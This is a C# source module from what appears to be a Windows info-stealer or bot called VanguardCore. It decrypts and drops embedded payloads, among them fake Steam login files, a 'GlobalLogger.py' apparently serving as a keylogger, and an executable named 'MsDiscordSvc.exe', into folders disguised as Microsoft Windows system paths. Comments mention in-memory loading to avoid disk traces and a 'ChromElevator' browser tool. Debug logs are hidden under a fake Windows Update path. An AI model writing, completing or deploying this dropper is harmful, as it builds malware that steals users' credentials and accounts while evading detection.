using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Linq;

namespace VanguardCore.Modules
{
    public static class ResourceModule
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool SetDllDirectory(string lpPathName);

        public static string WorkDir { get; private set; }

        static ResourceModule()
        {
            WorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Network");
            if (!Directory.Exists(WorkDir)) Directory.CreateDirectory(WorkDir);
        }

        public static void ExtractAll()
        {
            try
            {
                // 1. Set DLL search path so SQLite find e_sqlite3.dll there
                SetDllDirectory(WorkDir);

                Log("[RESOURCE] Starting extraction phase...");

                // 2. Extract resources (FORCE OVERWRITE)
                // ChromElevator is now Statically Linked (Mono-binary)
                // bore.bin is handled in-memory in ProxyModule (No disk drop)
                ExtractResource("e_sqlite3.dll", Path.Combine(WorkDir, "e_sqlite3.dll"));
                ExtractResource("GlobalLogger.py", Path.Combine(WorkDir, "GlobalLogger.py"));
                ExtractResource("SteamAlert.bin", Path.Combine(WorkDir, "SteamAlert.bin"));
                ExtractResource("SteamLogin.bin", Path.Combine(WorkDir, "SteamLogin.bin"));
                ExtractResource("MsDiscordSvc.bin", Path.Combine(WorkDir, "MsDiscordSvc.exe"));

                // 3. Ensure tablichka directory exists for Steam Notice
                string tablichkaDir = Path.Combine(WorkDir, "tablichka");
                if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
                
                string currentDirLogger = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
                if (!File.Exists(currentDirLogger))
                {
                    try { File.Copy(Path.Combine(WorkDir, "GlobalLogger.py"), currentDirLogger, true); } catch { }
                }
                
                Log("[RESOURCE] All tools extracted successfully.");
            }
            catch (Exception ex)
            {
                Log($"[RESOURCE ERROR] {ex.Message}");
            }
        }

        private static void ExtractResource(string shortName, string destPath)
        {
            try
            {
                // V6.15: ALWAY OVERWRITE to prevent corrupted/stale versions from blocking operations
                if (File.Exists(destPath)) try { File.Delete(destPath); } catch { }

                var assembly = Assembly.GetExecutingAssembly();
                
                // Try multiple namespace prefixes: 
                // 1. Namespace-less (root)
                // 2. VanguardCore.
                // 3. FinalBot.
                // 4. MicrosoftManagementSvc. (NativeAOT result)
                
                string[] possibleNames = {
                    shortName,
                    $"VanguardCore.{shortName}",
                    $"FinalBot.{shortName}",
                    $"MicrosoftManagementSvc.{shortName}",
                    $"VanguardCore.tools.{shortName}"
                };

                Stream? stream = null;
                string foundName = "";

                foreach (var name in possibleNames)
                {
                    stream = assembly.GetManifestResourceStream(name);
                    if (stream != null) {
                        foundName = name;
                        break;
                    }
                }

                if (stream == null)
                {
                    Log($"[RESOURCE] ERROR: Could not find resource {shortName} with any prefix.");
                    return;
                }

                using (stream)
                {
                    SaveStream(stream, destPath, shortName.EndsWith(".bin"));
                    Log($"[RESOURCE] Extracted: {Path.GetFileName(destPath)} (from {foundName})");
                }
            }
            catch (Exception ex) { Log($"[RESOURCE ERROR] {shortName}: {ex.Message}"); }
        }

        private static void SaveStream(Stream stream, string destPath, bool isEncrypted = false)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                stream.CopyTo(ms);
                byte[] data = ms.ToArray();
                if (isEncrypted)
                {
                    data = AesHelper.Decrypt(data);
                }
                if (data != null && data.Length > 0) 
                    File.WriteAllBytes(destPath, data);
                else
                    Log($"[RESOURCE ERROR] Decryption failed for {Path.GetFileName(destPath)}");
            }
        }

        private static void Log(string msg)
        {
            try { 
                string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log");
                File.AppendAllText(logPath, $"[{DateTime.Now}] {msg}\n"); 
            } catch { }
        }
    }
}
